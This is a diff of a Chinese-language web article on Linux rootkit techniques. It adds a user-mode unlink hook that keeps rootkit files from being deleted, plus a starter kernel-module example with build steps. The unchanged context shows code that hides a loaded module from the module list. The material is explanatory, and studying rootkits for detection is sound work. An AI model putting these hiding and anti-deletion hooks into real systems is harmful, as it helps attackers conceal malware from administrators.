@@ -228,8 +228,61 @@ Hello,<span class="w"> </span>World!
 <p>网络连接隐藏</p>
 <div class="highlight"><pre><span></span><code>HOOK netstat命令的相关函数调用， 一般会HOOK readdir/getdents来隐藏特定端口的连接
 </code></pre></div>
+<p>防止被删除
+    HOOK rm 命令的相关函数调用，一般会HOOK unlink函数，来避免自己被删除</p>
+<div class="highlight"><pre><span></span><code>int<span class="w"> </span>unlink<span class="w"> </span><span class="o">(</span>const<span class="w"> </span>char<span class="w"> </span>*pathname<span class="o">)</span>
+<span class="o">{</span>
+<span class="w">   </span><span class="nv">old_unlink</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>dlsym<span class="o">(</span>RTLD_NEXT,<span class="w"> </span><span class="s2">"unlink"</span><span class="o">)</span><span class="p">;</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">((</span>strstr<span class="w"> </span><span class="o">(</span>pathname,<span class="w"> </span>MAGIC_STRING<span class="o">))</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">(</span>strstr<span class="w"> </span><span class="o">(</span>pathname,<span class="w"> </span>CONFIG_FILE<span class="o">))</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">(</span>strstr<span class="w"> </span><span class="o">(</span>pathname,<span class="w"> </span>LIB_FILE<span class="o">)))</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="nv">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ENOENT<span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>-1<span class="p">;</span>
+<span class="w">  </span><span class="o">}</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span>old_unlink<span class="w"> </span><span class="o">(</span>pathname<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div>
 <h4>内核态可装载内核模块（LKM）</h4>
-<p>内核态的rootkit主要是可装载内核模块（LKM）实现， 主要是修改操作系统的核心部分，修改内部的数据结构或者进行系统函数HOOK。那么我们就聚焦关注两个点：修改哪些数据结构， 怎么HOOK与HOOK哪些函数。</p>
+<p>内核态的rootkit主要是可装载内核模块（LKM）实现， 主要是修改操作系统的核心部分，修改内部的数据结构或者进行系统函数HOOK。那么我们就聚焦关注两个点：修改哪些数据结构， 怎么HOOK与HOOK哪些函数。首先，了解一下LKM 怎么编写。</p>
+<h5>LKM 怎么编写</h5>
+<div class="highlight"><pre><span></span><code>CentOS
+<span class="c1">#  yum install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r)  gcc gcc-c++ make</span>
+
+Debian<span class="w"> </span>+<span class="w"> </span>Ubuntu
+<span class="c1">#  apt install -y  gcc g++ make  linux-headers-$(uname -r)</span>
+</code></pre></div>
+<p>确保系统已经安装了内核头文件和编译工具。</p>
+<p>下面是一个非常基础的内核模块示例代码（hello.c）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">#include &lt;linux/init.h&gt;   // 包含宏定义 module_init 和 module_exit</span>
+<span class="c1">#include &lt;linux/module.h&gt; // 包含核心模块函数和变量</span>
+
+//<span class="w"> </span>模块加载时调用的函数
+static<span class="w"> </span>int<span class="w"> </span>__init<span class="w"> </span>hello_start<span class="o">(</span>void<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>printk<span class="o">(</span>KERN_INFO<span class="w"> </span><span class="s2">"Hello world!\n"</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>返回0表示成功加载
+<span class="o">}</span>
+
+//<span class="w"> </span>模块卸载时调用的函数
+static<span class="w"> </span>void<span class="w"> </span>__exit<span class="w"> </span>hello_end<span class="o">(</span>void<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>printk<span class="o">(</span>KERN_INFO<span class="w"> </span><span class="s2">"Goodbye world!\n"</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+
+module_init<span class="o">(</span>hello_start<span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>注册模块初始化函数
+module_exit<span class="o">(</span>hello_end<span class="o">)</span><span class="p">;</span><span class="w">   </span>//<span class="w"> </span>注册模块退出函数
+
+MODULE_LICENSE<span class="o">(</span><span class="s2">"GPL"</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>声明模块许可，避免警告
+MODULE_AUTHOR<span class="o">(</span><span class="s2">"Your Name"</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>可选：作者信息
+MODULE_DESCRIPTION<span class="o">(</span><span class="s2">"A simple Hello world LKM"</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>可选：模块描述
+</code></pre></div>
+<p>为了编译这个模块，需要一个Makefile：</p>
+<div class="highlight"><pre><span></span><code>obj-m<span class="w"> </span>+<span class="o">=</span><span class="w"> </span>hello.o
+
+all:
+<span class="w">    </span>make<span class="w"> </span>-C<span class="w"> </span>/lib/modules/<span class="k">$(</span>shell<span class="w"> </span>uname<span class="w"> </span>-r<span class="k">)</span>/build<span class="w"> </span><span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span><span class="w"> </span>modules
+
+clean:
+<span class="w">    </span>make<span class="w"> </span>-C<span class="w"> </span>/lib/modules/<span class="k">$(</span>shell<span class="w"> </span>uname<span class="w"> </span>-r<span class="k">)</span>/build<span class="w"> </span><span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span><span class="w"> </span>clean
+</code></pre></div>
+<p>在包含源代码和Makefile的目录下运行make命令进行编译。如果一切正常，应该能看到生成的.ko文件。使用insmod hello.ko命令加载模块，并使用dmesg | tail查看日志输出确认模块是否正确加载。使用rmmod hello卸载模块，并再次检查日志以确认卸载消息。这只是一个入门级的例子。实际应用中，内核模块可能会更加复杂，包括错误处理、参数传递等。务必小心操作，因为错误的内核模块有可能导致系统不稳定或崩溃。</p>
 <h5>修改哪些数据结构</h5>
 <p>隐藏模块。具体功能如下：</p>
 <ul>
@@ -254,36 +307,8 @@ void<span class="w"> </span>module_hide<span class="o">(</span>void<span class="
 <span class="w">    </span>list_del<span class="o">(</span><span class="p">&amp;</span>THIS_MODULE-&gt;mkobj.kobj.entry<span class="o">)</span><span class="p">;</span>
 <span class="w">    </span><span class="nv">module_hidden</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>!module_hidden<span class="p">;</span>
 <span class="o">}</span>
-
-
-<span class="w"> </span><span class="sb">```</span>
-
-
-
-
-<span class="c1">##### 怎么HOOK与HOOK哪些函数</span>
-
-当某个程序需要借助网络、文件系统或其他系统特定活动进行工作时，它就必须经过内核。也就是说，在此时它将使用系统调用。我们可以使用一个名为Strace的工具。Strace将会列出程序所使用的系统调用。
-
-<span class="sb">```</span>bash
-<span class="c1"># yum -y install strace</span>
-<span class="c1">#cd /bin &amp;&amp; strace ls </span>
-
-ioctl<span class="o">(</span><span class="m">1</span>,<span class="w"> </span>TIOCGWINSZ,<span class="w"> </span>0x7ffedb86fcd0<span class="o">)</span><span class="w">    </span><span class="o">=</span><span class="w"> </span>-1<span class="w"> </span>ENOTTY<span class="w"> </span><span class="o">(</span>Inappropriate<span class="w"> </span>ioctl<span class="w"> </span><span class="k">for</span><span class="w"> </span>device<span class="o">)</span>
-openat<span class="o">(</span>AT_FDCWD,<span class="w"> </span><span class="s2">"."</span>,<span class="w"> </span>O_RDONLY<span class="p">|</span>O_NONBLOCK<span class="p">|</span>O_CLOEXEC<span class="p">|</span>O_DIRECTORY<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>
-getdents<span class="o">(</span><span class="m">3</span>,<span class="w"> </span>/*<span class="w"> </span><span class="m">1036</span><span class="w"> </span>entries<span class="w"> </span>*/,<span class="w"> </span><span class="m">32768</span><span class="o">)</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="m">32744</span>
-brk<span class="o">(</span>NULL<span class="o">)</span><span class="w">                               </span><span class="o">=</span><span class="w"> </span>0xc6f000
-brk<span class="o">(</span>0xc99000<span class="o">)</span><span class="w">                           </span><span class="o">=</span><span class="w"> </span>0xc99000
-brk<span class="o">(</span>NULL<span class="o">)</span><span class="w">                               </span><span class="o">=</span><span class="w"> </span>0xc99000
-brk<span class="o">(</span>NULL<span class="o">)</span><span class="w">                               </span><span class="o">=</span><span class="w"> </span>0xc99000
-brk<span class="o">(</span>0xc90000<span class="o">)</span><span class="w">                           </span><span class="o">=</span><span class="w"> </span>0xc90000
-brk<span class="o">(</span>NULL<span class="o">)</span><span class="w">                               </span><span class="o">=</span><span class="w"> </span>0xc90000
-mmap<span class="o">(</span>NULL,<span class="w"> </span><span class="m">311296</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_WRITE,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS,<span class="w"> </span>-1,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x7f60ea4a8000
-getdents<span class="o">(</span><span class="m">3</span>,<span class="w"> </span>/*<span class="w"> </span><span class="m">32</span><span class="w"> </span>entries<span class="w"> </span>*/,<span class="w"> </span><span class="m">32768</span><span class="o">)</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="m">1096</span>
-getdents<span class="o">(</span><span class="m">3</span>,<span class="w"> </span>/*<span class="w"> </span><span class="m">0</span><span class="w"> </span>entries<span class="w"> </span>*/,<span class="w"> </span><span class="m">32768</span><span class="o">)</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
 </code></pre></div>
-<p>我们需要关注的系统调用是getdents函数。</p>
-<p>在Linux系统中，如果我们想在内核中运行代码，我们可以借助于可装载内核模块（LKM）。一些有用的内核符号就会被内核导出，我们便能够去使用它们，或者也可以通过kallsyms_lookup_name函数来获取。在内核中，我们需要拦截getdents调用，并对它返回的值进行更改。那么，接下来要解决的问题就是我们要如何Hook getdents。</p>
+<h5>怎么HOOK与HOOK哪些函数</h5>
 <p>在内核之中，存在一个系统调用表。其中的系统调用编号（系统调用发生时rax的值）是其Handler在其表中的偏移量。
 系统调用表位于sys_call_table，它是系统内核的一块区间，其作用是将调用号和服务函数连接起来，当系统调用某一个syscall，就会通过sys_call_table查找到该服务函数。</p>
   </div>
